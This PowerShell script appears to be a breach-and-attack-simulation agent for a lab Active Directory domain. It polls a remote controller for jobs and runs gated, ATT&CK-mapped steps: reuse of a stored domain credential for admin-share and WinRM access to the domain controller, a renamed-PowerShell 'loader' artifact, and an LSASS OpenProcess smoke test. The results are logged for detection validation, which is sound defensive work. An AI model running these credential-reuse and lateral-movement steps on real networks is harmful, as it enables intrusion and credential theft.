param(
    [ValidateSet("win01", "dc01")]
    [string]$Role = "win01",
    [ValidateSet("simulation", "real")]
    [string]$Mode = "real",
    [string]$ControllerUrl = "http://54.116.166.183:443/api",
    [string]$ControllerToken = "",
    [string]$LogstashUrl = "http://10.60.40.10:8088",
    [int]$IntervalSeconds = 2,
    [switch]$AllowDcRemoteAccess,
    [switch]$AllowLoaderArtifacts,
    [switch]$AllowLsassTest,
    [switch]$AllowAuthMaterialTest
)

$ErrorActionPreference = "Stop"

if ($env:BAS_AV_ALLOW_DC_REMOTE_ACCESS -eq "1") { $AllowDcRemoteAccess = $true }
if ($env:BAS_AV_ALLOW_LOADER_ARTIFACTS -eq "1") { $AllowLoaderArtifacts = $true }
if ($env:BAS_AV_ALLOW_LSASS_TEST -eq "1") { $AllowLsassTest = $true }
if ($env:BAS_AV_ALLOW_AUTH_MATERIAL_TEST -eq "1") { $AllowAuthMaterialTest = $true }
if (-not $ControllerToken -and $env:BAS_AGENT_TOKEN) { $ControllerToken = $env:BAS_AGENT_TOKEN }

function Get-NowIso {
    return (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
}

function Get-AgentId {
    if ($Role -eq "win01") { return "sbav-win01-bas-agent" }
    return "sbav-dc01-bas-agent"
}

function Get-AgentPayload {
    if ($Role -eq "win01") {
        return [ordered]@{
            agent_id = Get-AgentId
            campaign_agent_id = "SB-AV"
            display_name = "SB-AV WIN01 PowerShell BasAgent"
            collector_type = "hanguel-ad-agent"
            agent_role = "win01"
            asset_id = "win01"
            segment_id = "endpoint-zone"
            hostname = "hanguel-win01"
            platform = "windows"
            execution_mode = $Mode
            safety_mode = "approval_required"
            capabilities = @("windows", "powershell", "network", "active_directory", "winrm", "smb")
            controls = @("hanguel_ad_agent", "powershell_logging", "windows_security_log", "hanguel_correlator")
        }
    }

    return [ordered]@{
        agent_id = Get-AgentId
        campaign_agent_id = "SB-AV"
        display_name = "SB-AV DC01 PowerShell BasAgent"
        collector_type = "hanguel-ad-agent"
        agent_role = "dc01"
        asset_id = "dc01"
        segment_id = "domain-zone"
        hostname = "hanguel-dc01"
        platform = "windows"
        execution_mode = $Mode
        safety_mode = "approval_required"
        capabilities = @("windows", "powershell", "sysmon", "forensic_artifacts")
        controls = @("windows_security_log", "sysmon", "hanguel_ad_agent", "hanguel_correlator")
    }
}

function Get-DcCredentialArtifactInfo {
    param([string]$Path = "C:\ProgramData\HanguelPMS\dc_cred.xml")

    $info = [ordered]@{
        path = $Path
        exists = $false
        username = $null
        owner = $null
        length = $null
        last_write_time = $null
        password_logged = $false
    }

    if (-not (Test-Path -LiteralPath $Path)) {
        return $info
    }

    $item = Get-Item -LiteralPath $Path
    $info.exists = $true
    $info.length = $item.Length
    $info.last_write_time = $item.LastWriteTime

    try {
        $acl = Get-Acl -LiteralPath $Path
        $info.owner = $acl.Owner
    } catch {
        $info.owner = "owner_lookup_failed:$($_.Exception.Message)"
    }

    try {
        $raw = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
        $match = [regex]::Match($raw, '<S\s+N="UserName">([^<]+)</S>', 'IgnoreCase')
        if ($match.Success) {
            $info.username = $match.Groups[1].Value
        }
    } catch {
        $info.username = "parse_error:$($_.Exception.Message)"
    }

    return $info
}

function Import-SbavDcCredential {
    param([string]$Path = "C:\ProgramData\HanguelPMS\dc_cred.xml")

    try {
        return Import-Clixml -LiteralPath $Path -ErrorAction Stop
    } catch {
        $artifact = Get-DcCredentialArtifactInfo -Path $Path
        $fallbackUser = if ($env:BAS_HANGUEL_DOMAIN_USER) { $env:BAS_HANGUEL_DOMAIN_USER } elseif ($artifact.username) { $artifact.username } else { "HANGUEL\Administrator" }
        if ($env:BAS_HANGUEL_DOMAIN_PASSWORD_B64 -or $env:BAS_HANGUEL_DOMAIN_PASSWORD) {
            try {
                if ($env:BAS_HANGUEL_DOMAIN_PASSWORD_B64) {
                    $plain = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:BAS_HANGUEL_DOMAIN_PASSWORD_B64))
                } else {
                    $plain = $env:BAS_HANGUEL_DOMAIN_PASSWORD
                }
                $secure = ConvertTo-SecureString $plain -AsPlainText -Force
                return New-Object System.Management.Automation.PSCredential($fallbackUser, $secure)
            } finally {
                $plain = $null
            }
        }

        $artifact = Get-DcCredentialArtifactInfo -Path $Path
        $currentUser = whoami
        $profile = $env:USERPROFILE
        $message = @(
            "DPAPI_CONTEXT_MISMATCH: failed to Import-Clixml for $Path",
            "error=$($_.Exception.Message)",
            "current_user=$currentUser",
            "user_profile=$profile",
            "artifact_username=$($artifact.username)",
            "artifact_owner=$($artifact.owner)",
            "artifact_last_write_time=$($artifact.last_write_time)",
            "fallback=provide BAS_HANGUEL_DOMAIN_PASSWORD_B64 for process-memory credential construction, or run in the original DPAPI context"
        ) -join "`n"
        throw $message
    }
}

function New-SbavHanguelArtifactDirectory {
    $dir = "C:\ProgramData\HanguelADAgent"
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    return $dir
}

function Invoke-SbavLoaderArtifactMarker {
    $dir = New-SbavHanguelArtifactDirectory
    $loaderPath = Join-Path $dir "hgl_loader.exe"
    $payloadPath = Join-Path $dir "hgl_payload.enc"
    $logPath = Join-Path $dir "hgl_loader_run.log"

    Copy-Item "$PSHOME\powershell.exe" $loaderPath -Force
    $payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("SB-AV controlled loader artifact marker $env:SPACEBAR_BAS_MARKER"))
    Set-Content -LiteralPath $payloadPath -Value $payload -Encoding ASCII
    Add-Content -LiteralPath $logPath -Value "timestamp=$(Get-NowIso) marker=$env:SPACEBAR_BAS_MARKER technique=T1027 artifact=controlled_obfuscated_payload"

    $processOutput = & $loaderPath -NoProfile -ExecutionPolicy Bypass -Command "Write-Output 'SB-AV loader artifact smoke marker only'" 2>&1
    $loaderHash = Get-FileHash -LiteralPath $loaderPath -Algorithm SHA256
    $payloadHash = Get-FileHash -LiteralPath $payloadPath -Algorithm SHA256

    [ordered]@{
        LoaderPath = $loaderPath
        LoaderSha256 = $loaderHash.Hash
        PayloadPath = $payloadPath
        PayloadSha256 = $payloadHash.Hash
        LogPath = $logPath
        ProcessOutput = ($processOutput | Out-String).Trim()
        Marker = $env:SPACEBAR_BAS_MARKER
        Note = "Controlled artifact only. No AV bypass or malicious loader was executed."
    } | Format-List | Out-String
}

function Invoke-SbavReflectiveDecodeMarker {
    $dir = New-SbavHanguelArtifactDirectory
    $logPath = Join-Path $dir "hgl_loader_run.log"
    $payload = [Convert]::FromBase64String("TVqQAAMAAAAEAAAA")
    $magic = [BitConverter]::ToString($payload[0..1])
    $payloadText = [Text.Encoding]::UTF8.GetString([Text.Encoding]::UTF8.GetBytes("manual_mapping_marker"))

    Add-Content -LiteralPath $logPath -Value "timestamp=$(Get-NowIso) marker=$env:SPACEBAR_BAS_MARKER technique=T1620 manual_mapping_inferred=true decoded_magic=$magic payload_label=$payloadText"

    [ordered]@{
        LogPath = $logPath
        DecodedMagic = $magic
        ManualMappingInferred = $true
        Marker = $env:SPACEBAR_BAS_MARKER
        Note = "Controlled in-memory decode marker only. No process injection or reflective loader execution was performed."
    } | Format-List | Out-String
}

function Invoke-SbavLsassProcessAccessSmoke {
    $dir = New-SbavHanguelArtifactDirectory
    $loaderPath = Join-Path $dir "hgl_loader.exe"
    $logPath = Join-Path $dir "hgl_loader_run.log"
    Copy-Item "$PSHOME\powershell.exe" $loaderPath -Force
    Add-Content -LiteralPath $logPath -Value "timestamp=$(Get-NowIso) marker=$env:SPACEBAR_BAS_MARKER technique=T1003.001 smoke_test=lsass_openprocess_no_dump"

    $code = @"
using System;
using System.Runtime.InteropServices;
public static class SpacebarLsassSmokeNative {
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool CloseHandle(IntPtr hObject);
}
"@
    $nativeTypeLoaded = $false
    try {
        [SpacebarLsassSmokeNative] | Out-Null
        $nativeTypeLoaded = $true
    } catch {
        $nativeTypeLoaded = $false
    }
    if (-not $nativeTypeLoaded) {
        Add-Type -TypeDefinition $code -ErrorAction Stop
    }

    $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
    $desiredAccess = [UInt32]0x1010
    $handle = [SpacebarLsassSmokeNative]::OpenProcess($desiredAccess, $false, [UInt32]$lsass.Id)
    $lastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    $opened = $handle -ne [IntPtr]::Zero
    if ($opened) {
        [SpacebarLsassSmokeNative]::CloseHandle($handle) | Out-Null
    }

    Start-Sleep -Seconds 3
    $sysmonMatches = Get-WinEvent -FilterHashtable @{ LogName="Microsoft-Windows-Sysmon/Operational"; Id=10; StartTime=(Get-Date).AddMinutes(-3) } -ErrorAction SilentlyContinue |
        Where-Object { $_.Message -match "hgl_loader.exe" -and $_.Message -match "lsass.exe" } |
        Select-Object -First 3 TimeCreated, Id, ProviderName, Message

    [ordered]@{
        LoaderPath = $loaderPath
        TargetProcess = "lsass.exe"
        TargetPid = $lsass.Id
        DesiredAccess = "0x1010"
        HandleOpened = $opened
        LastWin32Error = $lastError
        SysmonEvent10Matches = @($sysmonMatches).Count
        Marker = $env:SPACEBAR_BAS_MARKER
        Note = "Smoke-test only. No ReadProcessMemory call and no dump file creation."
    } | Format-List | Out-String
}

function Invoke-SbavAuthMaterialReuseValidation {
    $credPath = "C:\ProgramData\HanguelPMS\dc_cred.xml"
    $artifact = Get-DcCredentialArtifactInfo -Path $credPath
    $klistOutput = ""
    $secureChannelOutput = ""
    try { $klistOutput = (klist 2>&1 | Out-String).Trim() } catch { $klistOutput = "klist_failed:$($_.Exception.Message)" }
    try { $secureChannelOutput = (nltest /sc_query:hanguel.local 2>&1 | Out-String).Trim() } catch { $secureChannelOutput = "nltest_failed:$($_.Exception.Message)" }

    [ordered]@{
        CredentialArtifactPath = $artifact.path
        CredentialArtifactExists = $artifact.exists
        CredentialArtifactUsername = $artifact.username
        CredentialArtifactOwner = $artifact.owner
        CurrentUser = (whoami)
        SecureChannelProbe = $secureChannelOutput
        KerberosTicketSummary = $klistOutput
        Marker = $env:SPACEBAR_BAS_MARKER
        Note = "Auth-material reuse validation only. No NTLM hash injection, Mimikatz, or PtH tool was executed."
    } | Format-List | Out-String
}

function Invoke-Controller {
    param(
        [string]$Method,
        [string]$Path,
        $Body = $null
    )

    $uri = "$ControllerUrl$Path"
    $headers = @{}
    if ($ControllerToken) {
        $headers["X-BAS-Agent-Token"] = $ControllerToken
    }

    if ($null -eq $Body) {
        return Invoke-RestMethod -Method $Method -Uri $uri -Headers $headers -TimeoutSec 90
    }

    $json = $Body | ConvertTo-Json -Depth 40
    return Invoke-RestMethod -Method $Method -Uri $uri -Headers $headers -Body $json -ContentType "application/json" -TimeoutSec 90
}

function Get-StepMeta {
    param([int]$Order)

    switch ($Order) {
        9 {
            return [ordered]@{
                order = 9; agent_role = "win01"; name = "09. Scheduled Task: WIN01 PMS Agent Task Check"
                technique_id = "T1053.005"; behavior = "win01_pms_agent_task_check"
                log_id = "HAW-003"; actions = @("pms_agent_task_observed"); gates = @()
                script = {
                    Get-ScheduledTask |
                        Where-Object { $_.TaskName -match 'Hanguel|PMS|Patch|Update' -or $_.TaskPath -match 'Hanguel|PMS|Patch|Update' } |
                        Select-Object TaskName, TaskPath, State |
                        Format-Table -AutoSize | Out-String
                }
            }
        }
        10 {
            return [ordered]@{
                order = 10; agent_role = "win01"; name = "10. System Information Discovery: WIN01 Context"
                technique_id = "T1082"; behavior = "win01_system_context_discovery"
                log_id = "HAW-001"; actions = @("system_user_context", "system_ipconfig"); gates = @()
                script = { whoami; hostname; ipconfig /all | Out-String }
            }
        }
        11 {
            return [ordered]@{
                order = 11; agent_role = "win01"; name = "11. Domain Trust Discovery: DC Discovery"
                technique_id = "T1482"; behavior = "win01_domain_trust_discovery"
                log_id = "HAW-001"; actions = @("domain_controller_discovery", "dc_srv_dns_lookup"); gates = @()
                script = {
                    $domain = "hanguel.local"
                    nltest /dsgetdc:$domain
                    Resolve-DnsName "_ldap._tcp.dc._msdcs.$domain" -ErrorAction SilentlyContinue | Out-String
                }
            }
        }
        12 {
            return [ordered]@{
                order = 12; agent_role = "win01"; name = "12. Remote System Discovery: DC Port Probe"
                technique_id = "T1018"; behavior = "win01_remote_system_discovery"
                log_id = "HAW-001"; actions = @("dc_port_probe_445", "dc_port_probe_5985"); gates = @()
                script = {
                    $dcIp = "10.60.20.10"
                    Test-NetConnection $dcIp -Port 445 | Out-String
                    Test-NetConnection $dcIp -Port 5985 | Out-String
                }
            }
        }
        13 {
            return [ordered]@{
                order = 13; agent_role = "win01"; name = "13. Unsecured Credentials: dc_cred.xml Metadata"
                technique_id = "T1552"; behavior = "win01_dc_cred_metadata_check"
                log_id = "HAW-001"; actions = @("dc_cred_xml_discovered"); gates = @()
                script = {
                    $path = "C:\ProgramData\HanguelPMS\dc_cred.xml"
                    $artifact = Get-DcCredentialArtifactInfo -Path $path
                    [ordered]@{
                        Path = $artifact.path
                        Exists = $artifact.exists
                        Username = $artifact.username
                        Owner = $artifact.owner
                        Length = $artifact.length
                        LastWriteTime = $artifact.last_write_time
                        CurrentUser = (whoami)
                        UserProfile = $env:USERPROFILE
                        PasswordLogged = $false
                    } | Format-List | Out-String
                }
            }
        }
        14 {
            return [ordered]@{
                order = 14; agent_role = "win01"; name = "14. SMB/Admin Shares: DC C$ Read Check"
                technique_id = "T1021.002"; behavior = "win01_dc_admin_share_check"
                log_id = "HAW-004"; actions = @("dc_cred_xml_imported", "dc_c_admin_share_access"); failure_actions = @("dc_credential_check_failed"); gates = @("BAS_AV_ALLOW_DC_REMOTE_ACCESS")
                script = {
                    $credPath = "C:\ProgramData\HanguelPMS\dc_cred.xml"
                    $cred = Import-SbavDcCredential -Path $credPath
                    $share = "\\10.60.20.10\C$"
                    $driveName = "SBAVDC"
                    Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue
                    try {
                        New-PSDrive -Name $driveName -PSProvider FileSystem -Root $share -Credential $cred -ErrorAction Stop | Out-Null
                        "credential_user=$($cred.UserName)"
                        Test-Path "${driveName}:\"
                        Get-ChildItem "${driveName}:\" -ErrorAction Stop |
                            Select-Object -First 5 Name, Mode |
                            Format-Table -AutoSize | Out-String
                    } finally {
                        Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
        15 {
            return [ordered]@{
                order = 15; agent_role = "win01"; name = "15. WinRM: DC whoami"
                technique_id = "T1021.006"; behavior = "win01_dc_winrm_whoami"
                log_id = "HAW-002"; actions = @("dc_cred_xml_imported", "dc_winrm_whoami"); failure_actions = @("dc_credential_check_failed"); gates = @("BAS_AV_ALLOW_DC_REMOTE_ACCESS")
                script = {
                    $credPath = "C:\ProgramData\HanguelPMS\dc_cred.xml"
                    $cred = Import-SbavDcCredential -Path $credPath
                    Invoke-Command -ComputerName "10.60.20.10" -Credential $cred -ScriptBlock { whoami; hostname } -ErrorAction Stop | Out-String
                }
            }
        }
        16 {
            return [ordered]@{
                order = 16; agent_role = "dc01"; name = "16. Obfuscated Payload Artifact: Loader Marker"
                technique_id = "T1027"; behavior = "dc_loader_obfuscated_artifact"
                log_id = "HAD-004"; actions = @("loader_execution_log_found", "loader_file_artifact_found"); gates = @("BAS_AV_ALLOW_LOADER_ARTIFACTS")
                script = { Invoke-SbavLoaderArtifactMarker }
            }
        }
        17 {
            return [ordered]@{
                order = 17; agent_role = "dc01"; name = "17. Reflective Code Loading: In-Memory Decode Marker"
                technique_id = "T1620"; behavior = "dc_reflective_code_loading_artifact"
                log_id = "HAD-004"; actions = @("loader_powershell_event_found", "manual_mapping_inferred_marker"); gates = @("BAS_AV_ALLOW_LOADER_ARTIFACTS")
                script = { Invoke-SbavReflectiveDecodeMarker }
            }
        }
        18 {
            return [ordered]@{
                order = 18; agent_role = "dc01"; name = "18. LSASS Memory: Process Access Smoke Test"
                technique_id = "T1003.001"; behavior = "dc_lsass_process_access_smoke"
                log_id = "HAD-003"; actions = @("sysmon_lsass_process_access"); gates = @("BAS_AV_ALLOW_LSASS_TEST")
                script = { Invoke-SbavLsassProcessAccessSmoke }
            }
        }
        19 {
            return [ordered]@{
                order = 19; agent_role = "win01"; name = "19. Pass the Hash: Auth Material Reuse Validation"
                technique_id = "T1550.002"; behavior = "win01_auth_material_reuse_validation"
                log_id = "HAW-004"; actions = @("auth_material_reuse_validation", "pass_the_hash_attempt_emulated"); gates = @("BAS_AV_ALLOW_AUTH_MATERIAL_TEST")
                script = { Invoke-SbavAuthMaterialReuseValidation }
            }
        }
        default { return $null }
    }
}

function Test-Gates {
    param($Meta)

    $missing = @()
    foreach ($gate in @($Meta.gates)) {
        if ($gate -eq "BAS_AV_ALLOW_DC_REMOTE_ACCESS" -and -not $AllowDcRemoteAccess) {
            $missing += $gate
        }
        if ($gate -eq "BAS_AV_ALLOW_LOADER_ARTIFACTS" -and -not $AllowLoaderArtifacts) {
            $missing += $gate
        }
        if ($gate -eq "BAS_AV_ALLOW_LSASS_TEST" -and -not $AllowLsassTest) {
            $missing += $gate
        }
        if ($gate -eq "BAS_AV_ALLOW_AUTH_MATERIAL_TEST" -and -not $AllowAuthMaterialTest) {
            $missing += $gate
        }
    }

    return $missing
}

function Get-HanguelStage {
    param([string]$Action)

    if ($Action -in @("system_user_context", "system_ipconfig", "domain_controller_discovery", "dc_srv_dns_lookup", "dc_port_probe_445", "dc_port_probe_5985")) {
        return "discovery"
    }
    if ($Action -in @("dc_cred_xml_discovered", "dc_cred_xml_imported")) {
        return "credential_access"
    }
    if ($Action -in @("dc_winrm_whoami", "dc_c_admin_share_access", "dc_credential_check_failed")) {
        return "lateral_movement"
    }
    if ($Action -in @("loader_execution_log_found", "loader_file_artifact_found", "loader_powershell_event_found", "manual_mapping_inferred_marker")) {
        return "defense_evasion"
    }
    if ($Action -eq "sysmon_lsass_process_access") {
        return "credential_access"
    }
    if ($Action -in @("auth_material_reuse_validation", "pass_the_hash_attempt_emulated")) {
        return "lateral_movement"
    }
    return "telemetry"
}

function Get-HanguelRiskScore {
    param([string]$Action)

    if ($Action -in @("dc_winrm_whoami", "dc_c_admin_share_access")) { return 85 }
    if ($Action -in @("sysmon_lsass_process_access", "pass_the_hash_attempt_emulated")) { return 85 }
    if ($Action -eq "dc_cred_xml_imported") { return 80 }
    if ($Action -in @("loader_execution_log_found", "loader_file_artifact_found", "loader_powershell_event_found", "manual_mapping_inferred_marker", "auth_material_reuse_validation")) { return 75 }
    if ($Action -eq "dc_cred_xml_discovered") { return 70 }
    if ($Action -eq "dc_credential_check_failed") { return 45 }
    if ($Action -in @("domain_controller_discovery", "dc_srv_dns_lookup", "dc_port_probe_445", "dc_port_probe_5985")) { return 45 }
    if ($Action -in @("system_user_context", "system_ipconfig")) { return 35 }
    return 30
}

function Get-HanguelClassification {
    param([string]$Action)

    if ($Action -in @("dc_cred_xml_imported", "dc_winrm_whoami", "dc_c_admin_share_access", "loader_execution_log_found", "loader_file_artifact_found", "loader_powershell_event_found", "manual_mapping_inferred_marker", "sysmon_lsass_process_access", "auth_material_reuse_validation", "pass_the_hash_attempt_emulated")) {
        return "attack"
    }
    return "suspicious"
}

function Get-HanguelSeverity {
    param([int]$RiskScore)

    if ($RiskScore -ge 70) { return "high" }
    if ($RiskScore -ge 40) { return "medium" }
    return "informational"
}

function Send-HanguelEvent {
    param(
        $Meta,
        $RuntimeContext,
        $CommandResult,
        [string]$Action
    )

    $marker = $RuntimeContext._execution_marker
    $operationId = $RuntimeContext._operation_id
    $stepOrder = $RuntimeContext._step_order
    if (-not $stepOrder) { $stepOrder = $Meta.order }
    $classification = Get-HanguelClassification -Action $Action
    $riskScore = Get-HanguelRiskScore -Action $Action
    $stage = Get-HanguelStage -Action $Action

    $event = [ordered]@{
        "@timestamp" = Get-NowIso
        observer = [ordered]@{
            name = $(if ($Role -eq "win01") { "hanguel-win01" } else { "hanguel-dc01" })
            type = "sb07-emulation"
        }
        campaign = [ordered]@{ id = "SB-07"; name = "OZZY PMS Chain" }
        operation = [ordered]@{ id = $operationId }
        bas = [ordered]@{
            campaign_id = "SB-AV"
            operation_id = $operationId
            step_order = $stepOrder
            behavior = $Meta.behavior
            marker = $marker
            stdout_preview = ($CommandResult.stdout -as [string])
            stderr_preview = ($CommandResult.stderr -as [string])
        }
        labels = [ordered]@{
            spacebar_campaign = "SB-AV"
            spacebar_operation = $operationId
            spacebar_step = [string]$stepOrder
            spacebar_marker = $marker
        }
        run = [ordered]@{ id = $(if ($operationId) { $operationId } else { $marker }) }
        spacebar = [ordered]@{
            bas = [ordered]@{
                campaign_id = "SB-AV"
                operation_id = $operationId
                step_order = $stepOrder
                behavior = $Meta.behavior
                marker = $marker
            }
        }
        log = [ordered]@{
            id = $Meta.log_id
            source = [ordered]@{ name = "SB-07 BAS Emulation Event" }
        }
        event = [ordered]@{
            module = "hanguel_ad"
            kind = $(if ($classification -eq "normal") { "event" } else { "alert" })
            category = "host"
            type = @("info")
            action = $Action
            dataset = "hanguel.ad_agent"
            severity = Get-HanguelSeverity -RiskScore $riskScore
        }
        host = [ordered]@{
            name = $(if ($Role -eq "win01") { "hanguel-win01" } else { "hanguel-dc01" })
            domain = "hanguel.local"
            ip = @($(if ($Role -eq "win01") { "10.60.30.10" } else { "10.60.20.10" }))
        }
        agent = [ordered]@{ type = "spacebar-bas-agent"; role = $Role }
        threat = [ordered]@{
            framework = "MITRE ATT&CK"
            technique = @([ordered]@{ id = $Meta.technique_id; name = $Meta.name })
        }
        hanguel = [ordered]@{
            classification = $classification
            risk_score = $riskScore
            detection_stage = $stage
            source = "sb07-emulation"
            log_source_id = $Meta.log_id
            test_runner = $true
        }
        data = [ordered]@{
            simulation = $true
            operation_id = $operationId
            step_order = $stepOrder
            spacebar_marker = $marker
            password_logged = $false
            command = $CommandResult.command
            exit_code = $CommandResult.returncode
            output = ($CommandResult.stdout -as [string])
        }
        process = [ordered]@{
            command_line = $CommandResult.command
            exit_code = $CommandResult.returncode
        }
        message = "SB-AV BAS event: $Action"
    }

    try {
        $body = $event | ConvertTo-Json -Depth 40
        $response = Invoke-WebRequest -Method Post -Uri $LogstashUrl -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 5
        return [ordered]@{ event_action = $Action; ok = $true; status = [int]$response.StatusCode }
    } catch {
        return [ordered]@{ event_action = $Action; ok = $false; error = $_.Exception.Message }
    }
}

function Invoke-StepCommand {
    param($Meta)

    $stdout = ""
    $stderr = ""
    $returncode = 0
    $commandLabel = "PowerShell:$($Meta.behavior)"

    try {
        $output = & $Meta.script 2>&1
        $stdout = ($output | Out-String).Trim()
        if ($LASTEXITCODE -is [int] -and $LASTEXITCODE -ne 0) {
            $returncode = $LASTEXITCODE
        }
    } catch {
        $returncode = 1
        $stderr = $_.Exception.Message
    }

    return [ordered]@{
        name = $Meta.behavior
        executor = "powershell_mini_agent"
        agent_role = $Role
        platform = "windows"
        shell = "powershell"
        execution_marker = $env:SPACEBAR_BAS_MARKER
        command = $commandLabel
        returncode = $returncode
        stdout = $stdout
        stderr = $stderr
    }
}

function Invoke-SbavStep {
    param($Job, $Selection)

    $order = [int]$Selection.order
    $runtime = $Selection.runtime_context
    if (-not $runtime) {
        $runtime = [ordered]@{
            _operation_id = $Job.operation_id
            _job_id = $Job.job_id
            _step_order = $order
            _execution_marker = "$($Job.operation_id)-step-$order"
        }
    }

    $meta = Get-StepMeta -Order $order
    $started = Get-NowIso

    if ($null -eq $meta) {
        $status = "blocked"
        $commandResult = [ordered]@{ returncode = 1; stdout = ""; stderr = "Unsupported SB-AV Windows step: $order"; command = "unsupported" }
        $message = $commandResult.stderr
        $emission = [ordered]@{ configured = $false; message = $message }
    } elseif ($meta.agent_role -ne $Role) {
        $status = "blocked"
        $commandResult = [ordered]@{ returncode = 1; stdout = ""; stderr = "Step $order requires $($meta.agent_role), current role is $Role"; command = "wrong-role" }
        $message = $commandResult.stderr
        $emission = [ordered]@{ configured = $false; message = $message }
    } else {
        $missing = @(Test-Gates -Meta $meta)
        if ($missing.Count -gt 0) {
            $status = "blocked"
            $commandResult = [ordered]@{ returncode = 1; stdout = ""; stderr = "Missing safety gates: $($missing -join ', ')"; command = "blocked-by-gate" }
            $message = $commandResult.stderr
            $emission = [ordered]@{ configured = $false; message = $message; missing_gates = $missing }
        } elseif ($Mode -ne "real") {
            $status = "simulated"
            $commandResult = [ordered]@{ returncode = 0; stdout = "simulation only"; stderr = ""; command = "simulation" }
            $message = "Simulation mode. Command was not executed."
            $emission = [ordered]@{ configured = $false; message = $message }
        } else {
            $env:SPACEBAR_BAS_MARKER = $runtime._execution_marker
            $commandResult = Invoke-StepCommand -Meta $meta
            if ($commandResult.returncode -eq 0) {
                $status = "success"
            } elseif (($order -in @(14, 15)) -and ($commandResult.stderr -match "Key not valid for use in specified state")) {
                $status = "blocked"
            } else {
                $status = "failed"
            }
            $message = if ($status -eq "success") { "SB-AV Windows mini agent step completed." } else { $commandResult.stderr }
            $actionsToPost = @($meta.actions)
            if ($status -ne "success") {
                $actionsToPost = @($meta.failure_actions)
            }

            $posted = @()
            foreach ($action in $actionsToPost) {
                $posted += Send-HanguelEvent -Meta $meta -RuntimeContext $runtime -CommandResult $commandResult -Action $action
            }
            $emission = [ordered]@{ configured = $true; url = $LogstashUrl; posted = $posted }
        }
    }

    return [ordered]@{
        order = $order
        name = $(if ($meta) { $meta.name } else { "Unsupported SB-AV Windows step $order" })
        technique_id = $(if ($meta) { $meta.technique_id } else { "unknown" })
        phase = "attack"
        status = $status
        started_at = $started
        finished_at = Get-NowIso
        target_id = "SB-AV"
        runtime_context = $runtime
        module_result = [ordered]@{
            behavior = $(if ($meta) { $meta.behavior } else { "unsupported" })
            evidence_key = $(if ($meta) { $meta.behavior } else { "unsupported" })
            technique_id = $(if ($meta) { $meta.technique_id } else { "unknown" })
            description = $(if ($meta) { $meta.name } else { "Unsupported SB-AV Windows step $order" })
            execution_host = $(if ($Role -eq "win01") { "hanguel-win01" } else { "hanguel-dc01" })
            risk = "controlled"
            status = $status
            execution_mode = $Mode
            message = $message
            command_results = @($commandResult)
            hanguel_event_emission = $emission
            expected_log = [ordered]@{
                index = "hanguel-ad-agent-*"
                alert_index = "hanguel-alerts-*"
                log_id = $(if ($meta) { $meta.log_id } else { "SPACEBAR-BAS" })
                event_actions = $(if ($meta) { $meta.actions } else { @() })
            }
        }
    }
}

function Submit-JobResult {
    param($Job, [string]$Status, $Result, [string]$ErrorMessage = $null)

    $payload = [ordered]@{
        status = $Status
        execution_id = $(if ($Result) { $Result.execution_id } else { $null })
        result = $Result
        error = $ErrorMessage
    }

    Invoke-Controller -Method "POST" -Path "/agents/$(Get-AgentId)/jobs/$($Job.job_id)/result" -Body $payload | Out-Null
}

function Invoke-Job {
    param($Job)

    $executionId = "sbav-ps-$Role-$((Get-Date).ToUniversalTime().ToString('yyyyMMdd-HHmmss'))"
    $steps = @()

    foreach ($selection in @($Job.selected_steps)) {
        $steps += Invoke-SbavStep -Job $Job -Selection $selection
    }

    $result = [ordered]@{
        execution_id = $executionId
        campaign_id = $Job.campaign_id
        campaign_name = "Hanguel PMS AV Bypass Chain Validation"
        bas_agent = Get-AgentId
        agent = Get-AgentId
        execution_mode = $Mode
        requested_orders = $Job.selected_orders
        requested_steps = $Job.selected_steps
        include_normal = $Job.include_normal
        final_orders = @($steps | ForEach-Object { $_.order })
        steps = $steps
    }

    $hasFailed = @($steps | Where-Object { $_.status -eq "failed" }).Count -gt 0
    Submit-JobResult -Job $Job -Status $(if ($hasFailed) { "failed" } else { "completed" }) -Result $result
}

Write-Host "[+] Registering SB-AV Windows mini agent role=$Role controller=$ControllerUrl"
Invoke-Controller -Method "POST" -Path "/agents/register" -Body (Get-AgentPayload) | Out-Null

while ($true) {
    try {
        Invoke-Controller -Method "POST" -Path "/agents/$(Get-AgentId)/heartbeat" -Body @{ status = "online" } | Out-Null
        $next = Invoke-Controller -Method "GET" -Path "/agents/$(Get-AgentId)/jobs/next"
        if ($next.job) {
            Write-Host "[+] Job received: $($next.job.job_id)"
            Invoke-Job -Job $next.job
            Write-Host "[+] Job submitted: $($next.job.job_id)"
        }
    } catch {
        Write-Host "[!] Mini agent loop error: $($_.Exception.Message)"
    }
    Start-Sleep -Seconds $IntervalSeconds
}
